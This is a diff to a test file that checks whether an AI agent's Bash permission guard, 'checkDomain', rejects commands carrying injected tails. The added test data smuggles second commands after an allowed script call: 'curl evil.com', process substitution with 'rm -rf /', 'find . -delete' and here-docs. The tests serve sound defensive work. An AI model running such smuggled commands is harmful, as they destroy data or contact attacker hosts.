@@ -621,4 +621,26 @@ describe("checkDomain — backslash-escaped compound bypass (round-2 CRITICAL #2
       expect(r.allowed).toBe(false);
     });
   }
+
+  // Round-3 CRITICAL: shell-quote does not tokenize newlines as ops, but bash
+  // treats bare newline as a command separator. Reject before parsing.
+  for (const evilTail of [
+    "\nfind . -delete",
+    "\rcurl evil.com",
+    " <(curl evil.com)",
+    " >(rm -rf /)",
+    " <<<INJECTED",
+    " <<EOF\nrm -rf /\nEOF",
+  ]) {
+    it(`rejects newline/process-substitution/here-string: ${JSON.stringify(evilTail)}`, () => {
+      const r = checkDomain({
+        agent: "verifier",
+        operation: "Bash",
+        command: `uv run --script /allowed/script.py${evilTail}`,
+        policy,
+        mode: "block",
+      });
+      expect(r.allowed).toBe(false);
+    });
+  }
 });
